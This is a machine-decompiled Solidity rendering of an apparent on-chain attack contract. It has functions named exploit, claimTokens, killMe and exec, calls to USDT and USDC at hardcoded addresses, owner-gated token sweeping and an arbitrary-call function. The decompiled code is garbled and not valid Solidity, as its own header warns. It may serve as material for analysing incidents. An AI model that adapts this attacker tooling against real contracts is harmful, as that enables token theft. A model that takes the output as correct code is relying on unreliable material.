// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.6.5
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {

    bytes32 public stor_a;
    bytes32 public stor_b;
    bytes32 public stor_c;

    /// @custom:selector    0xdf8de3e7
    /// @custom:name        claimTokens
    /// @param              arg0 ["address", "bytes", "bytes20", "bytes32", "int", "int160", "int256", "string", "uint", "uint160", "uint256"]
    function claimTokens(address arg0) public {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(stor_a)));
        require(msg.sender == (address(stor_a)));
        require(address(arg0).code.length);
        (bool success, bytes memory ret0) = address(arg0).staticcall(abi.encode(0x70a0823100000000000000000000000000000000000000000000000000000000));
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_c.length == var_c.length);
        require(!var_c.length);
        require(address(arg0).code.length);
        (bool success, bytes memory ret0) = address(arg0).call{ value: 0 }(abi.encode(0xa9059cbb00000000000000000000000000000000000000000000000000000000));
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_c.length == var_c.length);
        if (address(this) == msg.sender) {
        }
    }

    /// @custom:selector    0xb603cd80
    /// @custom:name        killMe
    function killMe() public {
        require(msg.sender == (address(stor_a)));
        require(msg.sender == (address(stor_a)));
        if (address(this) == msg.sender) {
        }
    }

    /// @custom:selector    0x0aeb4ddf
    /// @custom:name        exploit
    /// @param              arg0 ["address", "bytes", "bytes20", "bytes32", "int", "int160", "int256", "string", "uint", "uint160", "uint256"]
    function exploit(address arg0) public {
        require(arg0 == (address(arg0)));
        require(tx.origin == (address(stor_a)));
        require(tx.origin == msg.sender);
        require(!tx.origin == 0x08e80ecb146dc0b835cf3d6c48da97556998f599);
        require(!0x01);
        assembly { addr := create(0, var_b, (0x0859 + var_b) - var_b) }
        require(CREATE);
        require(!0x1e8480, "Address: insufficient balance for call");
        require(!0x1e8480, "Address: insufficient balance for call");
        var_e = (((0x24 + var_b) + 0x40) - var_b) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0;
        var_b = (0x24 + var_b) + 0x40;
        var_b = 0x40 + var_b;
        require(!(address(this).balance < 0), "Address: insufficient balance for call");
        require(address(0xdac17f958d2ee523a2206206994597c13d831ec7).code.length, "Address: call to non-contract");
        require(!0 > var_b.length);
        (bool success, bytes memory ret0) = address(0xdac17f958d2ee523a2206206994597c13d831ec7).call{ value: 0 }(abi.encode(0x08c379a000000000000000000000000000000000000000000000000000000000));
        require(ret0.length == 0);
        require(!var_o);
        require(!(0 > var_b.length), "                                ");
        if (!0x20 > var_b.length) {
        }
        require(!var_o, "SafeERC20: ERC20 operation did not succeed");
        require(!(((0x80 + var_o) - 0x80) < 0x20), "SafeERC20: ERC20 operation did not succeed");
        require(var_e == var_e, "SafeERC20: ERC20 operation did not succeed");
        require(var_e, "SafeERC20: ERC20 operation did not succeed");
        var_b = (0x24 + var_b) + 0x40;
        require(!0 > var_b.length);
        (bool success, bytes memory ret0) = address(arg0).call{ value: 0 }(abi.encode(0x6f74207375636365656400000000000000000000000000000000000000000000));
        require(ret0.length == 0);
        require(address(CREATE).code.length);
        (bool success, bytes memory ret0) = address(CREATE).call{ value: 0 }(abi.encode(0x42c5967700000000000000000000000000000000000000000000000000000000));
        var_b = (0x24 + var_b) + 0x60;
        require(!0 > var_b.length);
        (bool success, bytes memory ret0) = address(arg0).call{ value: 0 }(abi.encode());
        require(ret0.length == 0);
        require(address(CREATE).code.length);
        (bool success, bytes memory ret0) = address(CREATE).call{ value: 0 }(abi.encode(0x42c5967700000000000000000000000000000000000000000000000000000000));
        require(!0x1e8480, "Address: insufficient balance for call");
        require(!0x1e8480, "Address: insufficient balance for call");
        var_b = (0x24 + var_b) + 0x40;
        var_b = 0x40 + var_b;
        require(!(address(this).balance < 0), "Address: insufficient balance for call");
        if (address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48).code.length) {
        }
        require(address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48).code.length);
        (bool success, bytes memory ret0) = address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48).staticcall(abi.encode(0xdd62ed3e00000000000000000000000000000000000000000000000000000000, 0x095ea7b300000000000000000000000000000000000000000000000000000000 | (uint224(var_g))));
        var_b = var_b + (uint248(ret0.length + 0x1f));
        require(!((var_b + ret0.length) - var_b) < 0x20);
        require(var_b.length == var_b.length);
        if (!var_b.length) {
        }
        var_b = var_b + (uint248(ret0.length + 0x3f));
        (bool success, bytes memory ret0) = address(arg0).call{ value: 0 }(abi.encode(ret0.length, 0x095ea7b300000000000000000000000000000000000000000000000000000000 | (uint224(var_g))));
        if (ret0.length == 0) {
        }
        var_b = var_b + (uint248(ret0.length + 0x3f));
        (bool success, bytes memory ret0) = address(arg0).call{ value: 0 }(abi.encode(ret0.length, 0xbafac6bd00000000000000000000000000000000000000000000000000000000 | (uint224(var_g))));
        if (ret0.length == 0) {
        }
        var_b = (0x24 + var_b) + 0x40;
        var_b = var_b + (uint248(ret0.length + 0x3f));
        require(!var_b.length);
        if (!var_b.length) {
            var_b = (0x24 + var_b) + 0x40;
            if (!(((0x20 + var_b) + var_b.length) - (0x20 + var_b)) < 0x20) {
            }
        }
        (bool success, bytes memory ret0) = address(0xdac17f958d2ee523a2206206994597c13d831ec7).call{ value: 0 }(abi.encode(ret0.length, 0x66168bd700000000000000000000000000000000000000000000000000000000 | (uint224(var_g)), (((0x24 + var_b) + 0x40) - var_b) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0));
        if (ret0.length == 0) {
        }
        if (address(0xdac17f958d2ee523a2206206994597c13d831ec7).code.length) {
        }
        if (!tx.origin == 0x919393b8eacb9e1f23bcd2f18b7de428687b1cd2) {
            if (!0x01) {
            }
            if (!tx.origin == 0x190b248f32cee228500fb72e87ab65fa98f258b5) {
                require(!tx.origin == 0x919393b8eacb9e1f23bcd2f18b7de428687b1cd2);
            }
            require(!tx.origin == 0x190b248f32cee228500fb72e87ab65fa98f258b5);
            require(!tx.origin == 0xc0ffeebabe5d496b2dde509f9fa189c25cf29671);
        }
        require(!0);
        assembly { addr := create(0, var_b, (0x0859 + var_b) - var_b) }
        if (CREATE) {
        }
    }

    /// @custom:selector    0x3df368bd
    /// @custom:name        __a
    function __a() public view returns (uint256) {
        return stor_b;
    }

    /// @custom:selector    0xbe6002c2
    /// @custom:name        exec
    /// @param              arg0 ["address", "bytes", "bytes20", "bytes32", "int", "int160", "int256", "string", "uint", "uint160", "uint256"]
    /// @param              arg1 ["bytes", "uint256", "int256", "string", "bytes32", "uint", "int"]
    function exec(address arg0, bytes memory arg1) public returns (bytes memory) {
        require(arg0 == (address(arg0)));
        require(!arg1 > 0xffffffffffffffff);
        require(!(arg1) > 0xffffffffffffffff);
        require(!((var_c + (uint248((0x20 + (arg1 + 0x1f)) + 0x1f))) > 0xffffffffffffffff) | ((var_c + (uint248((0x20 + (arg1 + 0x1f)) + 0x1f))) < var_c));
        bytes memory var_c = var_c + (uint248((0x20 + (arg1 + 0x1f)) + 0x1f));
        bytes memory var_d = (arg1);
        require(msg.sender == (address(stor_a)));
        require(msg.sender == (address(stor_a)));
        require(!0 > var_c.length);
        (bool success, bytes memory ret0) = address(arg0).call{ value: 0 }(abi.encode());
        require(ret0.length == 0);
        if (!0 < var_i) {
            if (!0x20 < var_i) {
            }
            if (!0 > var_i) {
                return abi.encodePacked(0x20, var_i);
                return abi.encodePacked(0x20, var_i);
            }
        }
        var_c = var_c + (uint248(ret0.length + 0x3f));
        if (!0 > var_c.length) {
        }
        (bool success, bytes memory ret0) = address(arg0).call{ value: 0 }(abi.encode());
        if (ret0.length == 0) {
        }
        if (address(this) == msg.sender) {
        }
    }

    /// @custom:selector    0xb0711e08
    /// @custom:name        Unresolved_b0711e08
    function Unresolved_b0711e08() public view returns (uint256) {
        return stor_c;
    }
}
